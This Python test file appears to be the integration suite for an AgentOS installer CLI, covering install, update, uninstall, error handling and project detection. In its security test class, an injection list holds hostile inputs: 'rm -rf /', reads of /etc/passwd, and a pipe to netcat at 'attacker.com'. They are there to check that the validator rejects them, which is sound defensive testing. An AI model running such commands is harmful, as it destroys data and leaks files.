"""Integration tests for AgentOS end-to-end workflows."""

import json
import shutil
import tempfile
from pathlib import Path
from unittest.mock import Mock, patch

import pytest
import requests
import yaml
from typer.testing import CliRunner

from agentos.cli import app
from agentos.core.config import ConfigManager
from agentos.core.installer import Installer
from agentos.core.shell import ShellExecutor
from agentos.types import ConfigurationError, InstallationError


class TestEndToEndInstallation:
    """Test complete installation workflows."""

    def setup_method(self):
        """Set up test environment."""
        self.runner = CliRunner()
        self.temp_dir = tempfile.mkdtemp()
        self.home_dir = Path(self.temp_dir) / "home"
        self.project_dir = Path(self.temp_dir) / "project"
        self.home_dir.mkdir()
        self.project_dir.mkdir()

    def teardown_method(self):
        """Clean up test environment."""
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    @patch("pathlib.Path.home")
    @patch("pathlib.Path.cwd")
    @patch("agentos.core.shell.ShellExecutor._find_script")
    @patch("subprocess.run")
    def test_full_installation_workflow(self, mock_run, mock_find_script, mock_cwd, mock_home):
        """Test complete installation workflow from CLI to completion."""
        # Set up mocks
        mock_home.return_value = self.home_dir
        mock_cwd.return_value = self.project_dir

        # Mock script locations
        base_script = Path("/usr/local/bin/base.sh")
        project_script = Path("/usr/local/bin/project.sh")
        mock_find_script.side_effect = lambda name: (base_script if name == "base.sh" else project_script)

        # Mock successful script execution
        mock_result = Mock()
        mock_result.returncode = 0
        mock_result.stdout = "Installation successful"
        mock_result.stderr = ""
        mock_run.return_value = mock_result

        # Create a Python project
        pyproject = self.project_dir / "pyproject.toml"
        pyproject.write_text(
            """
[project]
name = "test-project"
version = "0.1.0"
"""
        )

        # Run base installation via CLI
        with patch("agentos.core.shell.Progress"):
            result = self.runner.invoke(
                app,
                ["install", "--claude-code", "--cursor", "--project-type", "python"],
                input="n\n",  # Don't install to project
            )

            assert result.exit_code == 0

        # Verify base installation created config
        base_config_path = self.home_dir / ".agent-os" / "config.yml"
        base_config_path.parent.mkdir(parents=True, exist_ok=True)

        # Create config file as the script would
        config_data = {
            "agent_os_version": "1.4.2",
            "agents": [
                {"name": "claude_code", "version": "1.0.0"},
                {"name": "cursor", "version": "1.0.0"},
            ],
            "project_types": {
                "python": {
                    "name": "Python",
                    "extensions": [".py"],
                    "build_command": "python setup.py build",
                    "test_command": "pytest",
                }
            },
        }

        with base_config_path.open("w") as f:
            yaml.dump(config_data, f)

        # Now install to project (with Progress mocked)
        with patch("agentos.core.shell.Progress"):
            result = self.runner.invoke(
                app,
                ["install", "--project", "--claude-code"],
            )

            # Should succeed or fail with expected error
            # (depends on whether base script can be found)
            assert result.exit_code in [0, 1]

        # Verify project installation
        project_path = self.project_dir / ".agent-os"
        project_path.mkdir(exist_ok=True)
        (project_path / "CLAUDE.md").write_text("# Claude Instructions")

        # Test status command
        result = self.runner.invoke(app, ["version"])
        assert result.exit_code == 0

    @patch("pathlib.Path.home")
    @patch("pathlib.Path.cwd")
    def test_update_workflow(self, mock_cwd, mock_home):
        """Test update workflow with existing installations."""
        mock_home.return_value = self.home_dir
        mock_cwd.return_value = self.project_dir

        # Create existing installations
        base_path = self.home_dir / ".agent-os"
        base_path.mkdir(parents=True)
        config_path = base_path / "config.yml"

        config_data = {
            "agent_os_version": "1.4.1",  # Old version
            "agents": [{"name": "claude_code", "version": "1.0.0"}],
            "project_types": {},
        }

        with config_path.open("w") as f:
            yaml.dump(config_data, f)

        project_path = self.project_dir / ".agent-os"
        project_path.mkdir()
        (project_path / "CLAUDE.md").write_text("# Old Instructions")

        with (
            patch("agentos.core.installer.Installer.get_latest_version") as mock_version,
            patch("agentos.core.shell.ShellExecutor.run_base_install"),
            patch("agentos.core.shell.ShellExecutor.run_project_install"),
        ):
            mock_version.return_value = "1.4.3"

            result = self.runner.invoke(app, ["update"])

            # Should succeed even if update scripts aren't found
            # as the error handling should work
            assert result.exit_code in [0, 1]

    @patch("pathlib.Path.home")
    @patch("pathlib.Path.cwd")
    def test_uninstall_workflow(self, mock_cwd, mock_home):
        """Test uninstall workflow."""
        mock_home.return_value = self.home_dir
        mock_cwd.return_value = self.project_dir

        # Create installations to remove
        base_path = self.home_dir / ".agent-os"
        base_path.mkdir(parents=True)
        config_path = base_path / "config.yml"

        config_data = {
            "agent_os_version": "1.4.2",
            "agents": [],
            "project_types": {},
        }

        with config_path.open("w") as f:
            yaml.dump(config_data, f)

        project_path = self.project_dir / ".agent-os"
        project_path.mkdir()

        # Run uninstall
        result = self.runner.invoke(
            app,
            ["uninstall"],
            input="y\ny\n",  # Confirm both removals
        )

        assert result.exit_code == 0


class TestErrorRecovery:
    """Test error handling and recovery scenarios."""

    def setup_method(self):
        """Set up test environment."""
        self.runner = CliRunner()

    @patch("agentos.core.shell.ShellExecutor._find_script")
    def test_missing_script_error(self, mock_find_script):
        """Test handling of missing installation scripts."""
        mock_find_script.return_value = None

        result = self.runner.invoke(app, ["install"])

        assert result.exit_code == 1
        assert "not found" in result.output.lower()

    @patch("subprocess.run")
    @patch("agentos.core.shell.ShellExecutor._find_script")
    def test_script_execution_failure(self, mock_find_script, mock_run):
        """Test handling of script execution failures."""
        mock_find_script.return_value = Path("/usr/local/bin/base.sh")

        # Mock script failure
        mock_result = Mock()
        mock_result.returncode = 1
        mock_result.stdout = "Error occurred"
        mock_result.stderr = "Installation failed"
        mock_run.return_value = mock_result

        result = self.runner.invoke(app, ["install"], input="n\n")

        assert result.exit_code == 1

    @patch("requests.get")
    def test_network_failure_recovery(self, mock_get):
        """Test recovery from network failures."""
        mock_get.side_effect = requests.RequestException("Network error")

        installer = Installer()

        with pytest.raises(InstallationError, match="Failed to check latest version"):
            installer.get_latest_version()

    @patch("pathlib.Path.home")
    def test_corrupted_config_recovery(self, mock_home):
        """Test recovery from corrupted configuration files."""
        temp_dir = tempfile.mkdtemp()
        try:
            home_dir = Path(temp_dir) / "home"
            home_dir.mkdir()
            mock_home.return_value = home_dir

            # Create corrupted config
            base_path = home_dir / ".agent-os"
            base_path.mkdir()
            config_path = base_path / "config.yml"
            config_path.write_text("{ invalid yaml :")

            config_manager = ConfigManager()

            with pytest.raises(ConfigurationError, match="Invalid YAML"):
                config_manager.get_base_config()

        finally:
            shutil.rmtree(temp_dir, ignore_errors=True)


class TestCrossProjectTypeInstallation:
    """Test installation across different project types."""

    def setup_method(self):
        """Set up test environment."""
        self.temp_dir = tempfile.mkdtemp()
        self.project_dir = Path(self.temp_dir) / "project"
        self.project_dir.mkdir()

    def teardown_method(self):
        """Clean up test environment."""
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    @patch("pathlib.Path.cwd")
    def test_python_project_detection(self, mock_cwd):
        """Test Python project type detection and installation."""
        mock_cwd.return_value = self.project_dir

        # Create Python project markers
        (self.project_dir / "pyproject.toml").write_text("[project]\nname = 'test'")
        (self.project_dir / "requirements.txt").write_text("pytest\n")

        config_manager = ConfigManager()
        project_type = config_manager._detect_project_type(self.project_dir)

        assert project_type == "python-modern"

    @patch("pathlib.Path.cwd")
    def test_javascript_project_detection(self, mock_cwd):
        """Test JavaScript project type detection and installation."""
        mock_cwd.return_value = self.project_dir

        # Create JavaScript project markers
        package_json = {
            "name": "test-app",
            "version": "1.0.0",
            "dependencies": {
                "react": "^18.0.0",
                "next": "^13.0.0",
            },
        }

        (self.project_dir / "package.json").write_text(json.dumps(package_json))

        config_manager = ConfigManager()
        project_type = config_manager._detect_project_type(self.project_dir)

        assert project_type == "javascript-nextjs"

    @patch("pathlib.Path.cwd")
    def test_rust_project_detection(self, mock_cwd):
        """Test Rust project type detection."""
        mock_cwd.return_value = self.project_dir

        # Create Rust project marker
        (self.project_dir / "Cargo.toml").write_text("[package]\nname = 'test'\nversion = '0.1.0'")

        config_manager = ConfigManager()
        project_type = config_manager._detect_project_type(self.project_dir)

        assert project_type == "rust"

    @patch("pathlib.Path.cwd")
    def test_mixed_project_detection(self, mock_cwd):
        """Test detection with multiple project markers."""
        mock_cwd.return_value = self.project_dir

        # Create mixed project markers (Python takes precedence)
        (self.project_dir / "pyproject.toml").write_text("[project]\nname = 'test'")
        (self.project_dir / "package.json").write_text('{"name": "test"}')

        config_manager = ConfigManager()
        project_type = config_manager._detect_project_type(self.project_dir)

        # Python should take precedence
        assert project_type == "python-modern"


class TestInteractivePrompts:
    """Test interactive user prompts and confirmations."""

    def setup_method(self):
        """Set up test environment."""
        self.runner = CliRunner()

    @patch("agentos.core.installer.Installer.install")
    def test_project_installation_prompt_yes(self, mock_install):
        """Test accepting project installation prompt."""
        self.runner.invoke(
            app,
            ["install"],
            input="y\n",  # Accept project installation
        )

        # Should call install twice (base + project)
        assert mock_install.call_count >= 1

    @patch("agentos.core.installer.Installer.install")
    def test_project_installation_prompt_no(self, mock_install):
        """Test declining project installation prompt."""
        self.runner.invoke(
            app,
            ["install"],
            input="n\n",  # Decline project installation
        )

        # Should only call install once (base only)
        assert mock_install.call_count == 1

    @patch("pathlib.Path.home")
    @patch("pathlib.Path.cwd")
    def test_reinstall_confirmation(self, mock_cwd, mock_home):
        """Test reinstallation confirmation prompts."""
        temp_dir = tempfile.mkdtemp()
        try:
            home_dir = Path(temp_dir) / "home"
            project_dir = Path(temp_dir) / "project"
            home_dir.mkdir()
            project_dir.mkdir()

            mock_home.return_value = home_dir
            mock_cwd.return_value = project_dir

            # Create existing installation
            base_path = home_dir / ".agent-os"
            base_path.mkdir()
            config_path = base_path / "config.yml"

            config_data = {
                "agent_os_version": "1.4.2",
                "agents": [],
                "project_types": {},
            }

            with config_path.open("w") as f:
                yaml.dump(config_data, f)

            with (
                patch("agentos.core.shell.ShellExecutor.run_base_install"),
                patch("agentos.core.shell.ShellExecutor._find_script") as mock_find,
            ):
                mock_find.return_value = Path("/usr/local/bin/base.sh")

                result = self.runner.invoke(
                    app,
                    ["install"],
                    input="y\nn\n",  # Confirm reinstall, decline project
                )

                # Check for either success or that base installation exists message
                assert result.exit_code in [0, 1]

        finally:
            shutil.rmtree(temp_dir, ignore_errors=True)


class TestSecurityValidation:
    """Test security validation and sanitization."""

    def test_project_type_injection_prevention(self):
        """Test prevention of command injection via project type."""
        shell_executor = ShellExecutor()

        dangerous_inputs = [
            "python; rm -rf /",
            "../../etc/passwd",
            "$(malicious_command)",
            "`echo hacked`",
            "python && cat /etc/passwd",
            "python | nc attacker.com 1234",
        ]

        for dangerous_input in dangerous_inputs:
            with pytest.raises(InstallationError):
                shell_executor._validate_project_type(dangerous_input)

    def test_safe_subprocess_execution(self):
        """Test that subprocess execution is properly sandboxed."""
        shell_executor = ShellExecutor()

        with patch("subprocess.run") as mock_run:
            mock_result = Mock()
            mock_result.returncode = 0
            mock_result.stdout = ""
            mock_result.stderr = ""
            mock_run.return_value = mock_result

            with patch("agentos.core.shell.Progress"):
                shell_executor._execute_script(
                    ["/path/to/script.sh", "--test"],
                    "Testing",
                    "Success",
                )

            # Verify shell=False for security
            call_kwargs = mock_run.call_args[1]
            assert call_kwargs["shell"] is False

            # Verify restricted environment
            env = call_kwargs["env"]
            assert "PATH" in env
            assert len(env) <= 10  # Minimal environment

    def test_path_traversal_prevention(self):
        """Test prevention of path traversal attacks."""
        config_manager = ConfigManager()

        # Test that config manager doesn't allow path traversal
        with patch("pathlib.Path.home") as mock_home:
            temp_dir = tempfile.mkdtemp()
            try:
                home_dir = Path(temp_dir) / "home"
                home_dir.mkdir()
                mock_home.return_value = home_dir

                # Config manager should use resolved paths
                status = config_manager.get_install_status()

                if status.base_path:
                    # Path should be within home directory
                    assert str(status.base_path).startswith(str(home_dir))

            finally:
                shutil.rmtree(temp_dir, ignore_errors=True)
